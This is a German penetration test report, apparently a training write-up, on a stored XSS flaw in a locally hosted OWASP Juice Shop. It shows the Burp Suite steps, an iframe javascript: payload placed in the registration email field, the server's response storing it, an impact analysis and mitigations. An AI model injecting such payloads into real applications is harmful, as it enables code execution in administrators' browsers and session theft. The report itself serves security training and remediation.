# Penetration Test Bericht – Client-side XSS Protection (Stored XSS über Registrierung)

## 1. Ziel  
Ziel dieses Pentests im OWASP Juice Shop war es, eine Stored XSS-Schwachstelle nachzuweisen, bei der ein Administrator im Administration-Bereich beim Anzeigen von Benutzereingaben ein JavaScript-Popup mit der Meldung `xss` erhält.

---

## 2. Scope (Testumfang)  
- **Zielsystem:** OWASP Juice Shop – lokal gehostet  
- **Testmethode:** Black-Box  
- **Testzeitraum:** 18.08.2025 - 19.08.2025
- **Tools:** DevTools, Burp Suite (Proxy + Repeater)

---

## 3. Vorgehensweise  
1. Zum Login Bereich vom Owasp Juice Shop Navigieren. In unserm Fall: `http://127.0.0.1:3000/#/login`.
2. Neuen Nutzer erstellen. Auf `Not yet a customer?` klicken und Formular normal ausfüllen.
3. Wichtig: Im Feld `Email` zunächst eine valide Adresse eintragen (z. B. `bob@gmail.com`). Und auf `Register` klicken
4. In Burpsuite auf HTTP history gehen und nach dem Post request suchen, womit wir den neuen user erstellen wollten. Du solltest unter URL nach /api/Users suchen. Im Request fenster solltest du dann sowas sehen:
``` JSON
{
    "email":"bob@gmail.com",
    "password":"hallo123",
    "passwordRepeat":"hallo123",
    "securityQuestion":{
        "id":7,
        "question":"Name of your favorite pet?",
        "createdAt":"2025-08-19T21:22:24.645Z",
        "updatedAt":"2025-08-19T21:22:24.645Z"
    },
    "securityAnswer":"zaya"
}
```
5. Rechtsklick im Request fenster bereich und `Send to Repeater klicken`. Danach oben in der Leiste auf Repeater klicken, damit sich die Repeater ansicht öffnet. Hier manipulieren wir jetzt unseren user json und fügen unsere payload `<iframe src="javascript:alert(`xss`)">` im value vom key: `email` ein.
``` JSON
"email": "<iframe src='javascript:alert(`xss`)'>"
```

6. Anschliessend klicken wir auf Send. Als Response müssten wir eine positive rückmeldung erhalten:
``` JSON
HTTP/1.1 201 Created
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Location: /api/Users/24
Content-Type: application/json; charset=utf-8
Content-Length: 329
ETag: W/"149-GmvgsHBP7D/olaVrO92LkHEHCec"
Vary: Accept-Encoding
Date: Tue, 19 Aug 2025 21:54:12 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{
    "status":"success",
    "data":{
        "username":"",
        "role":"customer",
        "deluxeToken":"",
        "lastLoginIp":"0.0.0.0",
        "profileImage":"/assets/public/images/uploads/default.svg",
        "isActive":true,
        "id":24,
        "email":"<iframe src='javascript:alert(`xss`)'>",
        "updatedAt":"2025-08-19T21:54:11.986Z",
        "createdAt":"2025-08-19T21:54:11.986Z",
        "deletedAt":null
    }
}
```
7. Jetzt können wir uns als admin einloggen und zur administration page navigieren `http://127.0.0.1:3000/#/administration`

8. Wenn die Schritte richtig angewandt wurden müsste jetzt ein Alert mit dem Text `xss` angezeigt werden.

---

## 4. Gefundene Schwachstelle(n)
- Stored XSS über das Feld „E-Mail bei Registrierung“
- Eingaben werden ungefiltert in der Datenbank gespeichert.
- Darstellung im Adminbereich erfolgt ohne Schutz, sodass JavaScript-Code ausgeführt wird.

---

## 5. Risikoanalyse / Auswirkung:
- Ausführung von fremdem JavaScript im Admin-Browser.
- Gefahr von Session-Diebstahl, Manipulation der Admin-Ansicht oder Datenabfluss.
- Jeder gespeicherte bösartige Account könnte beim Öffnen des Adminbereichs dauerhaft XSS auslösen.

---

## 6. Empfehlung  
- Eingaben prüfen (Frontend & Backend):
Nicht nur im Browser (JavaScript), sondern auch auf dem Server sicherstellen, dass ins Feld E-Mail nur echte E-Mail-Adressen im richtigen Format gespeichert werden.
- Vor dem Speichern in die Datenbank validieren:
Alle Eingaben sollten bereinigt werden, damit keine HTML-Tags oder JavaScript gespeichert werden können.
- Ausgabe absichern:
Wenn Eingaben (wie E-Mail-Adressen) später angezeigt werden, sollten sie so ausgegeben werden, dass der Browser sie nicht als HTML oder JavaScript interpretiert, sondern wirklich nur als Text.
- Content Security Policy (CSP):
Eine einfache CSP-Regel kann helfen, dass fremder JavaScript-Code nicht ausgeführt werden darf.

---

## 7. Fazit  
Die Anwendung ist im Feld E-Mail bei der Registrierung für Stored XSS anfällig.
Durch Manipulation des Requests konnte eine Payload gespeichert werden, die beim Öffnen der Administration-Sektion automatisch ausgeführt wird.
Die Schwachstelle ist kritisch, da Angreifer so Code im Browser des Administrators ausführen könnten.
Eine einfache Validierung und Absicherung der Eingaben würde dieses Problem verhindern.

---

